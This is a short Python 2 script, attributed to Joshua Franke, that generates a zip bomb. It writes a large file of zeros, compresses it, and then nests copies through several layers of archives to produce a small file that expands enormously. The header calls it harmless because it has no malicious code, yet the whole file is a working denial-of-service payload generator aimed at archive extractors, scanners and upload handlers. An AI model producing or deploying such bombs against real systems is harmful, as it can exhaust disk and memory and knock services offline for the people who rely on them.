'''
Joshua Franke
Creates a Zip Bomb (without malicious code in it)
Version: 1.0.3

'''

'''                           Imports and Variables                         '''
print "Importing Files..."
import zipfile, os

print "Initializing Most Variables..."
numBytes = 1
numKilos = 1024 * numBytes
numMegas = 1024 * numKilos
numGigas = 0 # Place holder

print "Zipbombs tend to use Gigabyte files or bigger (there is no bigger here)"
print ""
print "Do you want the file to be a Gigabyte '0' a Megabyte '1' or a Kilobyte '2'"
num = raw_input("Type the number without the quotes")






'''                           Write File Functions                          '''
# File smaller than a Gig
def other():
    for x in range(0,num):
        file.write("0")
    file.close()


# File that is a Gig
def GigFunction():
    count = 0
    for x in range(0,1024):
        for x in range(0,num):
            file.write("0")
        count += 1
        print str(count) + " MB Written"
    file.close()







'''                       Copy and Zipping Function                          '''
def copyNzip():
    # Creates a zip file
    zf = zipfile.ZipFile("0.zip","w")
    # Without compress_type with file will not be smaller
    zf.write("run.txt",compress_type=zipfile.ZIP_DEFLATED)
    zf.close
    
    os.remove("run.txt")
    
    # First Branch
    zf = zipfile.ZipFile("secondBranch.zip","w")
    
    for x in range(0,16):
        fl = str(x) + ".zip"
        fl2 = str(x+1) + ".zip"
        zf.write(fl,compress_type=zipfile.ZIP_DEFLATED)
        os.rename(fl,fl2)
    zf.close()
    os.remove("16.zip")
    os.rename("secondBranch.zip","0.zip")


    # Second Branch
    zf = zipfile.ZipFile("thirdBranch.zip","w")

    for x in range(0,8):
        fl = str(x) + ".zip"
        fl2 = str(x+1) + ".zip"
        zf.write(fl,compress_type=zipfile.ZIP_DEFLATED)
        os.rename(fl,fl2)
    zf.close()
    os.remove("8.zip")
    os.rename("thirdBranch.zip","0.zip")

    # Third Branch
    zf = zipfile.ZipFile("fourthBranch.zip","w")

    for x in range(0,4):
        fl = str(x) + ".zip"
        fl2 = str(x+1) + ".zip"
        zf.write(fl,compress_type=zipfile.ZIP_DEFLATED)
        os.rename(fl,fl2)
    zf.close()
    os.remove("4.zip")
    os.rename("fourthBranch.zip","0.zip")
    
    # Fourth Branch
    zf = zipfile.ZipFile("fifthBranch.zip","w")

    for x in range(0,2):
        fl = str(x) + ".zip"
        fl2 = str(x+1) + ".zip"
        zf.write(fl,compress_type=zipfile.ZIP_DEFLATED)
        os.rename(fl,fl2)
    zf.close()
    os.remove("2.zip")
    os.rename("fifthBranch.zip","0.zip")







'''                                Main Code                                '''
print "Creating File..."
file = open("run.txt","w")
    
# Find correct function to call
if num == "0":
    num = numMegas
    GigFunction()
    copyNzip()
elif num == "1":
    num = numMegas
    other()
    copyNzip()
elif num == "2":
    num = numKilos
    other()
    copyNzip()
else:
    print "Not an Option"
    print "Stopping program"

print "Finished"
raw_input("Press Enter to Exit")
